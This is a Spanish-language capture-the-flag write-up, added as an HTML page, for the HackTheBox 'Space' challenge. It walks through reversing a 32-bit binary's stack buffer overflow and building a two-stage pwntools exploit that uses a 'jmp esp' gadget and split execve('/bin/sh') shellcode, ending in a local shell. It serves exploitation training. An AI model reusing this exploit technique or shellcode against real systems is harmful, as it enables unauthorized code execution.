@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width initial-scale=1" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="robots" content="noindex">
+
+  <title>Writeup HackTheBox Space</title>
+
+  <meta name="description" content="Resolución del reto Space de la plataforma de HackTheBox">
+  <meta name="author" content="xchg2pwn">
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Writeup HackTheBox Space">
+  <meta name="twitter:description" content="Resolución del reto Space de la plataforma de HackTheBox">
+  <meta name="twitter:creator" content="xchg2pwn">  
+  <meta name="twitter:image" content="/images/hackthebox/challenges.png" />
+
+  <meta property="og:site_name" content="xchg2pwn" />
+  <meta property="og:type" content="article">
+  <meta property="og:title" content="Writeup HackTheBox Space">
+  <meta property="og:description" content="Resolución del reto Space de la plataforma de HackTheBox">
+  <meta property="og:image" content="/images/hackthebox/challenges.png" />
+
+  <link rel="manifest" href="/images/favicons/manifest.json">
+  <link rel="shortcut icon" type="image/png" sizes="64x64" href="/images/hackthebox/challenges.png">
+
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+  
+  <meta name="msapplication-TileColor" content="#ffc40d">
+  <meta name="msapplication-TileImage" content="/images/favicons/mstile-144x144.png">
+  <meta name="theme-color" content="#ffffff">
+
+  <link rel="stylesheet" href="/css/main.css?1678854914750547280">
+  <link rel="alternate" type="application/rss+xml" title="Writeup HackTheBox Space" href="/feed.xml">
+</head>
+
+  <body style="background-color: #282828;">
+  
+    <span class="mobile btn-mobile-menu">
+      <i class="icon icon-list btn-mobile-menu__icon"></i>
+      <i class="icon icon-x-circle btn-mobile-close__icon hidden"></i>
+    </span>
+
+<header class="panel-cover" style="background-image: url(/images/cover.jpg)">
+
+  <div class="panel-main">
+    <div class="panel-main__inner panel-inverted">
+      <div class="panel-main__content">
+
+          <img src="/images/profile.jpg" class="user-image zoomable" alt="xchg2pwn">
+          <h1 class="panel-cover__title panel-title scale-up-center">xchg2pwn</h1>
+
+        <hr class="panel-cover__divider">
+        <p class="panel-cover__description slide-top">Entusiasta del reversing y desarrollo de exploits</p>
+        <hr class="panel-cover__divider panel-cover__divider--secondary">
+
+        <div class="navigation-wrapper">
+         <nav class="cover-navigation cover-navigation--primary">
+            <ul class="navigation">
+              <li class="navigation__item grow"><a href="/challenges" title="xchg2pwn" class="blog-button">Challenges</a></li>
+            </ul>
+          </nav>
+
+          <nav class="cover-navigation navigation--social">
+            <ul class="navigation">
+
+              <li class="navigation__item grow">
+                <a href="https://github.com/xchg2pwn" title="Github" target="_blank">
+                  <i class="icon icon-social-github"></i>
+                  <span class="label">GitHub</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://linkedin.com/in/enrique-de-los-santos-694863233" title="Linkedin" target="_blank">
+                  <i class="icon icon-social-linkedin"></i>
+                  <span class="label">Linkedin</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://instagram.com/xchg2pwn" title="Instagram" target="_blank">
+                  <i class="icon icon-social-instagram"></i>
+                  <span class="label">Instagram</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://twitter.com/xchg2pwn" title="Twitter" target="_blank">
+                  <i class="icon icon-social-twitter"></i>
+                  <span class="label">Twitter</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="https://youtube.com/@xchg2pwn" title="Youtube" target="_blank">
+                  <i class="icon icon-social-youtube"></i>
+                  <span class="label">Youtube</span>
+                </a>
+              </li>
+
+              <li class="navigation__item grow">
+                <a href="mailto:xchg2pwn@gmail.com" title="Correo Electronico" target="_blank">
+                  <i class="icon icon-mail"></i>
+                  <span class="label">Email</span>
+                </a>
+              </li>              
+
+            </ul>
+          </nav>
+        </div>
+      </div>
+    </div>
+
+    <div class="panel-cover--overlay"></div>
+  </div>
+</header>
+    <br>
+    <div class="content-wrapper">
+      <div class="content-wrapper__inner">
+        <article class="post-container post-container--single">
+    <div class="izquierda">
+      <h3 class="post-title">Contenido</h3><br>
+      <ul>
+        <li><a href="#reversing">Reversing</a></li>
+        <li><a href="#exploitation">Explotación</a></li>
+      </ul>
+  </div>
+
+  <header class="post-header slide-top">
+    <h4 class="post-title">HackTheBox</h4>
+    <picture><img src="/images/hackthebox/challenges.png" style="float: right; margin-right:0px; margin-left:0px; height:70px;" class="include_image zoomable"/></picture>
+    <h2 class="post-title">Space</h2><br>
+  </header>
+  
+<section class="post" id="reversing">
+<br><h3 class="post-title">Reversing</h3><br>
+
+<p class="plain-text">El <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/HackTheBox/Space/space">binario</a> entregado de primeras no nos deja claro el uso que este tiene o que hace, ya que el programa muestra un prompt pero al enviar alguna data no devuelve nada</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ./space</span><span class="p">
+> AAAABBBB  </span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Iniciamos por desensamblar la función <code class="language-plaintext highlighter-rouge">main</code>, esta muuestra un prompt con <code class="language-plaintext highlighter-rouge">printf</code> y llama a <code class="language-plaintext highlighter-rouge">fflush</code> pasandole como argumento el puntero al <code class="language-plaintext highlighter-rouge">stdout</code>, es redundante</p>
+<a href="/challenges/space/1.png" target="_blank"><div><p><img src="/challenges/space/1.png"></p></div></a>
+
+<p class="plain-text">Luego de ello lee <code class="language-plaintext highlighter-rouge">0x1f</code> o <code class="language-plaintext highlighter-rouge">31</code> bytes desde el <code class="language-plaintext highlighter-rouge">stdin</code> o <code class="language-plaintext highlighter-rouge">0</code> utilizando <code class="language-plaintext highlighter-rouge">read</code> y lo guarda en una variable llamada buffer, luego de ello simplemente llama a la función <code class="language-plaintext highlighter-rouge">vuln</code></p>
+<a href="/challenges/space/2.png" target="_blank"><div><p><img src="/challenges/space/2.png"></p></div></a>
+
+<p class="plain-text">La función <code class="language-plaintext highlighter-rouge">vuln</code> recibe como argumento el buffer y lo copia a un nuevo destino en <code class="language-plaintext highlighter-rouge">ebp - 14</code>, un destino mas pequeño que el origen ocasiona un buffer overflow</p>
+<a href="/challenges/space/3.png" target="_blank"><div><p><img src="/challenges/space/3.png"></p></div></a>
+
+</section>
+
+<section class="post" id="exploitation">
+<br><h3 class="post-title">Explotación</h3><br>
+
+<p class="plain-text">Iniciamos mirando las protecciones con <code class="language-plaintext highlighter-rouge">checksec</code>, todas están deshabilitadas y no tenemos restricciones asi que deberia ser una explotación bastante sencilla</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ checksec</span><span class="p"> space
+[</span><span class="az">*</span><span class="p">] '/home/user/space'
+    Arch:       i386-32-little
+    RELRO:      </span><span class="ro">No RELRO</span><span class="p">
+    Stack:      </span><span class="ro">No canary found</span><span class="p">
+    NX:         </span><span class="am">NX unknown - GNU_STACK missing</span><span class="p">  
+    PIE:        </span><span class="ro">No PIE (0x8048000)</span><span class="p">
+    Stack:      </span><span class="ro">Executable</span><span class="p">
+    RWX:        </span><span class="ro">Has RWX segments</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Podemos crear un payload, enviaremos <code class="language-plaintext highlighter-rouge">14 A's</code> para rellenar el buffer antes de <code class="language-plaintext highlighter-rouge">ebp</code>, <code class="language-plaintext highlighter-rouge">4 B's</code> que seran el valor de ebp en el <code class="language-plaintext highlighter-rouge">leave</code> y <code class="language-plaintext highlighter-rouge">4 C's</code> que tomaran el valor del return address, y finalmente algunas <code class="language-plaintext highlighter-rouge">D's</code> que simplemente se guardarán en el stack</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">, </span><span class="s">"continue"</span><span class="p">)  
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="mi"> 14</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"B"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"C"</span><span class="o"> *</span><span class="mi"> 4</span><span class="p">
+payload</span><span class="o"> +=</span><span class="no"> b</span><span class="s">"D"</span><span class="o"> *</span><span class="mi"> 16</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit podemos ver la primera restricción, el problema es que de todas nuestras <code class="language-plaintext highlighter-rouge">D's</code> solo se escriben <code class="language-plaintext highlighter-rouge">9</code> en el stack, aunque saltemos al <code class="language-plaintext highlighter-rouge">esp</code> es muy poco</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Program received signal SIGSEGV, Segmentation fault.  
+</span><span class="az">0x43434343</span><span class="p"> in</span><span class="am"> ??</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> p/x $ebp
+</span><span class="az">$1</span><span class="p"> = 0x42424242
+</span><span class="ro">pwndbg></span><span class="p"> p/x $eip
+</span><span class="az">$2</span><span class="p"> = 0x43434343
+</span><span class="ro">pwndbg></span><span class="p"> x/s $esp
+</span><span class="az">0xff881270</span><span class="p">:     "DDDDDDDDD"
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Los unicos <code class="language-plaintext highlighter-rouge">9</code> bytes son un espacio muy limitado para un shellcode, algo interesante es que <code class="language-plaintext highlighter-rouge">17</code> bytes después del stack se encuentra nuevamente el inicio del buffer</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ro">pwndbg></span><span class="p"> x/s $esp+17
+</span><span class="az">0xff881282</span><span class="p">:     'A' &ltrepetidos 14 veces>, "BBBBCCCCDDDDDDDDD"  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, iniciamos buscando una forma de ejecutar un pequeño <code class="language-plaintext highlighter-rouge">stage</code> usaremos un gadget que ejecuta un <code class="language-plaintext highlighter-rouge">jmp esp</code> para ejecutar un par de instrucciones y un short jump</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ ropper</span><span class="p"> --file space --jmp esp  
+
+JMP Instructions
+================
+
+</span><span class="ro">0x0804919f</span><span class="p">:</span><span class="am"> jmp</span><span class="p"> esp</span><span class="az">;</span><span class="p">
+
+1 gadgets found</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Lo primero que ejecutaremos serán las <code class="language-plaintext highlighter-rouge">2</code> primeras instrucciones de un <a href="https://github.com/xchg2pwn/BinaryExploitation/blob/main/shellcode/bin_sh.asm">shellcode</a> que pesan <code class="language-plaintext highlighter-rouge">3</code> bytes, luego de ello hacemos un short jump <code class="language-plaintext highlighter-rouge">14</code> bytes más adelante</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> gdb, p32, asm
+
+shell</span><span class="o"> =</span><span class="p"> gdb.debug(</span><span class="s">"./space"</span><span class="p">,</span><span class="s"> "b *0x804919f</span><span class="mi">\n</span><span class="s">continue"</span><span class="p">)  
+
+shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
+    push 0xb        # execve()
+    pop eax         # $eax = execve()
+
+    jmp $+0xe       # short jump
+"""</span><span class="p">)
+
+offset </span><span class="o">= </span><span class="mi">18</span><span class="p">
+junk</span><span class="o"> =</span><span class="no"> b</span><span class="s">"A"</span><span class="o"> *</span><span class="p"> offset
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> junk
+payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804919f</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(shellback)</span><span class="c1"> # 1nd stage</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Entonces, llegamos al breakpoint en el <code class="language-plaintext highlighter-rouge">jmp esp</code>, este ejecutará las <code class="language-plaintext highlighter-rouge">2</code> instrucciones del shellcode y saltará al inicio del buffer que ahora mismo apunta a las <code class="language-plaintext highlighter-rouge">18 A's</code></p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="p">Breakpoint 1,</span><span class="az"> 0x0804919f </span><span class="p">in</span><span class="am"> _</span><span class="p"> ()
+</span><span class="ro">pwndbg></span><span class="p"> x/i $eip
+=></span><span class="az"> 0x804919f</span><span class="p"> &lt</span><span class="am">_</span><span class="p">+13>:</span><span class="ve">    jmp</span><span class="ro">    esp
+pwndbg></span><span class="p"> x/3i $esp
+   </span><span class="az">0xff8645a0</span><span class="p">:</span><span class="ve">  push</span><span class="az">   0xb
+   0xff8645a2</span><span class="p">:</span><span class="ve">  pop</span><span class="ro">    eax</span><span class="p">
+   </span><span class="az">0xff8645a3</span><span class="p">:</span><span class="ve">  jmp</span><span class="az">    0xff8645b1
+</span><span class="ro">pwndbg></span><span class="p"> x/s 0xff8645b1
+</span><span class="az">0xff8645b1</span><span class="p">:     'A' &ltrepetidos 18 veces>  
+</span><span class="ro">pwndbg></span>
+</code></pre></div></div><br>
+
+<p class="plain-text">El shellcode pesa apenas <code class="language-plaintext highlighter-rouge">21</code> bytes y ya enviamos <code class="language-plaintext highlighter-rouge">3</code> de ellos, lo que nos deja <code class="language-plaintext highlighter-rouge">18</code> restantes, afortunadamente <code class="language-plaintext highlighter-rouge">18</code> bytes es justo el tamaño del offset por lo que podemos cambiarlo por las <code class="language-plaintext highlighter-rouge">A's</code>, asi ejecutamos el shellcode en 2 partes</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!usr/bin/python3
+</span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p32, asm
+
+shell</span><span class="o"> =</span><span class="p"> process(</span><span class="s">"./space"</span><span class="p">)
+
+shellcode</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
+    push 0x68       # $esp = &"h"
+    pushw 0x732f    # $esp = &"/sh"
+    push 0x6e69622f # $esp = &"/bin/sh"  
+    mov ebx, esp    # $ebx = &"/bin/sh"  
+
+    xor ecx, ecx    # $ecx = NULL
+    cdq             # $edx = NULL
+
+    int 0x80        # syscall
+"""</span><span class="p">)
+
+shellback</span><span class="o"> =</span><span class="p"> (</span><span class="s">"""
+    push 0xb        # execve()
+    pop eax         # $eax = execve()
+
+    jmp $+0xe       # short jump
+"""</span><span class="p">)
+
+payload</span><span class="o">  =</span><span class="no"> b</span><span class="s">""</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(shellcode)</span><span class="c1"> # 2nd stage</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804919f</span><span class="p">)</span><span class="c1"> # jmp esp;</span><span class="p">
+payload</span><span class="o"> +=</span><span class="p"> asm(shellback)</span><span class="c1"> # 1nd stage</span><span class="p">
+
+shell.sendlineafter(</span><span class="no">b</span><span class="s">"> "</span><span class="p">, payload)
+shell.interactive()</span>
+</code></pre></div></div><br>
+
+<p class="plain-text">Al ejecutar el exploit el primer stage ejecuta una parte de las instrucciones y salta al segundo stage que ejecuta el resto del shellcode devolviendo asi la shell</p>
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="ve">❯ python3 </span><span class="p">solve.py
+[</span><span class="ve">+</span><span class="p">] Starting local process './space': pid 195324  
+[</span><span class="az">*</span><span class="p">] Switching to interactive mode
+</span><span class="ro">$ </span><span class="p">id
+uid=1000(user) gid=1000(user) groups=1000(user)
+</span><span class="ro">$</span>
+</code></pre></div></div><br>
+
+</section>
+
+</article>
+  </div>
+  <footer class="footer">
+    <span class="footer__copyright">&copy; 2024 - xchg2pwn</span>
+  </footer><br><br>
+
+<script type="text/javascript" src="/js/jquery.min.js"></script>
+<script type="text/javascript" src="/js/main.js?1678894953382991917"></script>
+
+    </div>
+  </body>
+</html>
